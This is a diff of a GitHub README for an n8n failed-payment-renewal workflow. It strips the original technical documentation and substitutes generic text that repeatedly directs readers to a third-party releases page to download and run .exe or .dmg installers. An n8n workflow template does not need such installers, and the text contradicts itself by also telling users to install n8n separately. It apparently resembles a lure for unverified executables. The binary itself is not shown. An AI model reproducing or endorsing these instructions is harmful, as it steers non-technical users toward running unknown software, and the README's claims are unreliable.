@@ -1,170 +1,84 @@
+# 🛠️ n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts - Automate Renewal Issue Management  
 
-# Handle Failed Payment Renewals with AI Analysis, Jira Tickets, and Slack Alerts
+[![Download](https://img.shields.io/badge/Download-v1.0-green.svg)](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases)
 
-This n8n workflow automates failed subscription renewal handling by validating webhook data, using AI to analyze urgency and churn risk, creating a Jira Finance task, and notifying your finance team via Slack.
-If required fields are missing, it sends a detailed error alert for manual review.
+## 📖 Overview  
+This application helps you manage failed payment renewals seamlessly. It automatically analyzes reasons for payment failures, opens Jira tickets, and sends Slack notifications to the correct teams. Use this workflow to reduce customer churn and speed up recovery times.
 
----
+## 🚀 Getting Started  
+Follow these simple steps to get started with the application. No technical knowledge is required.
 
-## ⚡ Quick Implementation Steps (Start Using in 60 Seconds)
+1. **Check System Requirements**  
+   Ensure your system meets the following basic requirements:
+   - A stable internet connection.
+   - Access to a Slack workspace.
+   - Access to a Jira account.
+   - Installed n8n (you can find installation instructions on n8n’s official site.).
 
-1. Import the workflow JSON into your n8n instance.
-2. Add **Jira** and **Slack** credentials.
-3. Configure your payment provider to send a POST request to:
-   `/payment-failed-renewal`
-4. Test using a sample payload:
+2. **Download the Application**  
+   Visit this page to download: [Releases Page](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases).  
+   Choose the latest version available and click the download link for your operating system.
 
-```json
-{
-  "customerId": "C-101",
-  "customerEmail": "[email protected]",
-  "subscriptionId": "S-500",
-  "amount": 39.99
-}
-```
+## 🛠️ Installation  
+After downloading, follow these steps to install:
 
-5. Activate the workflow.
+1. **Locate the Downloaded File**  
+   Find where your browser saved the downloaded file. This is usually in the "Downloads" folder.
 
----
+2. **Install the Application**  
+   - For Windows: Double-click the .exe file and follow the instructions.  
+   - For MacOS: Open the .dmg file and drag the application to your Applications folder.  
+   - For Linux: Follow the package installation instructions provided on the n8n website.
 
-## What It Does
+## 🎯 Setup n8n Workflow  
+After installation, you need to set up the workflow:
 
-When a subscription renewal fails, the workflow:
+1. **Open n8n**  
+   Launch the n8n application on your computer.
 
-* Receives the payment failure via webhook
-* Validates required fields
-* Uses **AI (OpenAI or compatible LLM)** to assess urgency and churn risk
-* Routes high-value failures to a priority path
-* Creates a **Jira Finance Task** with an AI-generated recovery email draft
-* Sends a **Slack alert** with churn risk details
-* Sends an **error alert** if required data is missing
+2. **Import the Workflow Template**  
+   Go to the "Workflows" section in n8n.  
+   Click on "Import" and upload the downloaded workflow template file.
 
----
+3. **Configure Your Credentials**  
+   Set up your Slack and Jira credentials:
+   - Go to the "Credentials" section in n8n.
+   - Enter your Slack API token and Jira API token.
 
-## Who’s It For
+4. **Configure Workflow Settings**  
+   Adjust the workflow settings according to your needs:
+   - Select the criteria for identifying failed payments.
+   - Set notification preferences for Slack alerts.
+   - Customize Jira ticket details as needed.
 
-* Finance and billing teams automating revenue recovery
-* SaaS businesses with recurring subscriptions
-* Support or ops teams using **Jira** for billing workflows
-* Slack-centric finance and operations teams
-* Companies seeking AI-powered churn risk insights
+5. **Save the Workflow**  
+   Click on the "Save" button to keep your settings.
 
----
+## 🔄 Running the Workflow  
+To run the workflow:
 
-## Requirements
+1. **Start n8n**  
+   Make sure n8n is running on your machine.
 
-* n8n (cloud or self-hosted)
-* **OpenAI API key** (or another LLM provider)
-* **Jira Software** account with access to the Finance project
-* **Slack bot token** with permission to post messages
-* A payment provider that supports JSON webhooks
-* Webhook endpoint configured at:
-  `https://YOUR-N8N-URL/webhook/payment-failed-renewal`
+2. **Activate the Workflow**  
+   Select the workflow you imported and click on "Activate".  
 
----
+3. **Monitor Performance**  
+   For any failed payments, the system will now create a Jira ticket and send notifications via Slack. 
 
-## How It Works & Setup Flow
+## 📬 Support  
+If you encounter any issues or have questions, please reach out through the GitHub Issues section of this repository. Your feedback helps us improve the project.
 
-### Step-by-Step Process
+## 🎉 Contribution  
+We welcome contributions. If you have ideas for enhancements or fixes, feel free to fork the repository and submit a pull request.
 
-1. **Webhook Trigger**
-   Receives the payment failure payload from the payment provider.
+## 📄 License  
+This project is open source. You can use, modify, and distribute it according to the MIT License. Check the LICENSE file for more details.
 
-2. **Payload Validation**
-   Confirms the presence of required fields:
+## 🔗 Additional Resources  
+- [n8n Documentation](https://docs.n8n.io) for more details on setting up and using n8n.  
+- [Slack API Documentation](https://api.slack.com) for help with Slack integration.  
+- [Jira API Documentation](https://developer.atlassian.com/cloud/jira/platform/rest/v2/) for details on Jira integration.
 
-   * `customerId`
-   * `customerEmail`
-   * `subscriptionId`
-   * `amount`
-
-3. **AI Analysis**
-   Evaluates failure context, urgency, and churn risk, and generates a suggested recovery email.
-
-4. **Routing Logic**
-   A switch node routes high-value failures (e.g., amount > $500) to a priority handling path.
-
-5. **Jira Task Creation**
-   Creates a Finance task with AI-generated insights and recovery steps.
-
-6. **Slack Notification**
-   Sends a structured alert with churn risk, amount, and customer details.
-
----
-
-## Node Customization Guide
-
-### Webhook Node
-
-* Add token-based security or Basic Auth
-* Apply JSON schema validation for stricter payload checks
-
-### Validation Logic
-
-* Enforce valid email format
-* Ensure `amount` is numeric
-* Define optional fallback values if needed
-
-### Jira Node
-
-You can customize:
-
-* Issue summary and description format
-* Labels such as `billing-recovery`, `urgent`
-* Custom Jira fields
-* Issue type or target project
-
-### Slack Node
-
-Enhancements include:
-
-* Role or user mentions (e.g., `@finance-team`)
-* Rich message blocks
-* Multiple channel routing
-
----
-
-## Optional Add-Ons
-
-* **Automated customer recovery emails**
-* **Escalation rules** (e.g., ≥3 failures → escalate)
-* Store records in **Google Sheets** or **Airtable**
-* Push data to CRMs like **HubSpot**, **Salesforce**, or **Zoho**
-* **Sales alerts** for high-value account failures
-
----
-
-## Use Case Examples
-
-1. Stripe subscription renewal failure → Jira task + Slack alert
-2. Chargebee retry attempts exhausted → automated escalation
-3. Declined credit card → AI-drafted recovery task
-4. Razorpay or PayPal renewal failure → finance notification
-5. Incomplete webhook payload → Slack error alert for manual review
-
----
-
-## Troubleshooting Guide
-
-| Issue                             | Possible Cause                    | Solution                                           |
-| --------------------------------- | --------------------------------- | -------------------------------------------------- |
-| Webhook not triggering            | Incorrect URL or HTTP method      | Verify endpoint and ensure POST is used            |
-| Jira ticket not created           | Permission or payload issue       | Check Jira credentials and required fields         |
-| Slack shows undefined values      | Missing payload fields            | Ensure all required keys are included              |
-| Error alert triggered incorrectly | Field name mismatch               | Use exact keys like `customerId`, `subscriptionId` |
-| Payment events not received       | Firewall or CDN blocking requests | Whitelist your n8n webhook URL                     |
-| Workflow not running              | Workflow not activated            | Enable the workflow                                |
-
----
-
-## Need Help?
-
-If you’d like help extending this workflow—such as adding CRM integrations, advanced churn scoring, retry logic, or automated recovery emails—the **WeblineIndia** automation experts can assist with:
-
-* Jira and Slack automation pipelines
-* Payment webhook integrations
-* AI-powered billing insights
-* Finance workflow optimization
-* End-to-end automation solutions
-
-Reach out anytime for expert support 🚀
+## 🔗 Download & Install  
+To begin using the application, visit this page to download: [Releases Page](https://github.com/Davidbruno1/n8n-Handle-failed-payment-renewals-with-AI-analysis-Jira-tickets-Slack-alerts/releases). Follow the installation steps outlined above, and you'll be ready to manage failed payment renewals with ease.
